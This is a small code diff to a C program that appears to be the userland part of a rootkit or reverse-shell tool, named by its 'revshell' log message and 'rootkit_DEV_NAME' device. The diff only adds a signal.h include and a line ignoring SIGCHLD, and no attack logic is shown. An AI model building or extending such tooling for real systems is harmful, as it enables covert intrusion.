@@ -3,6 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <signal.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -11,6 +12,8 @@
 #include "interface.h"
 
 int main(void) {
+    signal(SIGCHLD, SIG_IGN);
+
     printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
     fflush(stdout);
 
